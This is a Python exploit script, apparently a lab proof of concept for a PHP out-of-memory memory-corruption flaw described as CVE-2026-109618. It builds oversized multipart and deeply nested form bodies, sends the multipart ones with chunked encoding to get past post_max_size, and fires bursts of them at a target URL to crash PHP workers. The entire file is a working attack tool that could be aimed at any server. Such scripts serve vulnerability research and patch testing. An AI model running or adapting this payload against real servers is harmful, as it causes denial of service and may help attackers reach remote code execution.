#!/usr/bin/env python3
"""oom_trigger.py — CVE-2026-109618 (RCE via OOM corruption).

Implements the OOM strategies described in GHSA-w8hw-w9fx-j79w: force a request
to hit memory_limit at a moment when internal request memory is reachable but
not fully initialized. Pre-patch, PHP bails with longjmp() and request shutdown
may then read/branch on that invalid memory — observable in the lab as worker
segfaults / heap-corruption aborts in the Apache error log.

Strategies
  chunked-long-names  1020 parts x 128KB part names over chunked encoding:
                      parsed memory is ~2-3x wire size, so ~330MB of symbol
                      table allocations from a body that never trips
                      post_max_size (no Content-Length pre-check) -> OOM
                      mid-parse, per request. Primary strategy.
  deep-arrays         name="a[0][1]...[63]" nesting: each parsed level
                      allocates hashtables far beyond the wire cost
  many-parts          thousands of tiny parts (bounded by
                      max_multipart_body_parts=1020; kept for comparison)
  long-names          same amplification over Content-Length bodies
                      (post_max_size rejects these at default settings)
  chunked             generic chunked carrier for any strategy above

All strategies keep parsed-size >> wire-size so the 8M post_max_size default is
not what terminates the request; memory_limit (128M) is.

Usage:
  python3 oom_trigger.py http://127.0.0.1:8080/ --strategy many-parts --bursts 300
"""

from __future__ import annotations

import argparse
import random
import string
import sys

import common


def build_deep_arrays(seq: int) -> bytes:
    """urlencoded deep nesting: amplifies allocation during php_default_treat_data."""
    depth = 64
    name = "".join(f"[{i % 10}]" for i in range(depth))
    # many fields, each shallow in bytes but deep in parsed structure
    fields = []
    for i in range(400):
        fields.append(f"f{i}{name}={string.ascii_letters[i % 52]}")
    return ("&".join(fields)).encode()


def build_many_parts(seq: int) -> bytes:
    """~4000 tiny multipart parts: ~50-100x parsed-memory amplification."""
    parts = []
    for i in range(4000):
        parts.append((f"p{i}", None, b"x"))
    return common.multipart(parts, boundary=f"b{seq}")


def build_long_names(seq: int) -> bytes:
    """1 MiB part names; rfc1867 allocates and copies them into symbol tables."""
    big_name = "N" * (1024 * 1024)
    parts = [(big_name + str(i), None, b"y") for i in range(40)]
    return common.multipart(parts, boundary=f"b{seq}")


def build_long_filenames(seq: int) -> bytes:
    """Oversized filenames in file parts: amplified in multipart header parsing."""
    parts = [(f"up{i}", "F" * (512 * 1024) + f"{i}.bin", b"z" * 64)
             for i in range(40)]
    return common.multipart(parts, boundary=f"b{seq}")


def build_chunked_long_names(seq: int, name_len: int = 128 * 1024) -> bytes:
    """1020 parts x NAME_LEN names, sent chunked (no Content-Length).

    Design against the default caps discovered empirically:
      - max_multipart_body_parts=1020  -> stay at/below 1020 parts
      - max_input_vars=1000            -> one var per part, truncation is fine
      - post_max_size=8M               -> bypassed by chunked encoding
      - memory_limit=128M              -> 1020 * name_len * ~2.5 copies
    The OOM lands mid-rfc1867-parse; each request is one draw from the
    wrong-moment longjmp lottery the advisory describes. Varying name_len
    moves WHERE in the parse the allocation fails, sampling different
    partially-initialized cleanup states.

    Boundary is FIXED to "cln0" so the header always matches the body;
    the mismatch class of bug silently yields zero parsed parts.
    """
    parts = [(("K" * name_len) + str(i), None, b"x") for i in range(1020)]
    return common.multipart(parts, boundary="cln0")


BUILDERS = {
    "deep-arrays": build_deep_arrays,
    "many-parts": build_many_parts,
    "long-names": build_long_names,
    "long-filenames": build_long_filenames,
    "chunked-long-names": build_chunked_long_names,
}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("base")
    ap.add_argument("--strategy", default="chunked-long-names", choices=sorted(BUILDERS))
    ap.add_argument("--bursts", type=int, default=200,
                    help="number of trigger requests")
    ap.add_argument("--vary", action="store_true", default=True,
                    help="vary name lengths across bursts to sample different "
                         "OOM failure points in the parse (chunked strategies)")
    ap.add_argument("--timeout", type=float, default=15.0)
    args = ap.parse_args()
    base = args.base.rstrip("/")

    build = BUILDERS[args.strategy]
    needs_chunked = args.strategy.startswith("chunked")
    baseline = common.baseline_error_log()
    outcomes = {"ok": 0, "reset": 0, "timeout": 0, "http_err": 0}

    # Build the body ONCE for the heavy strategies — 130MB per burst is not
    # something to rebuild per request.
    body = build(0) if needs_chunked else None

    for seq in range(args.bursts):
        if needs_chunked:
            if args.vary:
                # sample different failure points inside rfc1867 parsing:
                # empirically, amplification is ~1.2x wire size, so anything
                # under 128KB x 1020 parts never reaches the 128M limit
                name_len = random.choice((128 * 1024, 192 * 1024, 256 * 1024,
                                          384 * 1024, 512 * 1024))
                body = build(seq, name_len)
        else:
            body = build(seq)
        if args.strategy == "deep-arrays":
            ctype = "application/x-www-form-urlencoded"
            path = "/?action=info"
        else:
            ctype = "multipart/form-data; boundary=cln0" if needs_chunked else \
                f"multipart/form-data; boundary=b{seq}"
            path = "/?action=upload"
        status, _body, err = common.http(
            "POST", base + path, body=body,
            headers={"Content-Type": ctype}, timeout=args.timeout,
            chunked=needs_chunked)
        if status == 200:
            outcomes["ok"] += 1
        elif status == 0:
            if "timed out" in err or "Timeout" in err:
                outcomes["timeout"] += 1
            else:
                outcomes["reset"] += 1
        else:
            outcomes["http_err"] += 1
        if seq % 25 == 0:
            common.eprint(f"  [{seq}/{args.bursts}] {outcomes}")

    print(f"done: {outcomes}")
    crashes = common.new_crash_lines(baseline)
    if crashes:
        print(f"\n[+] {len(crashes)} worker-crash line(s) in error log:")
        for ln in crashes[:20]:
            print("   ", ln.rstrip())
        return 0
    print("\n[-] no worker crashes observed in the error log for this run.")
    print("    Note: hitting the wrong-moment OOM is probabilistic (AC:H);")
    print("    increase --bursts or try another strategy.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
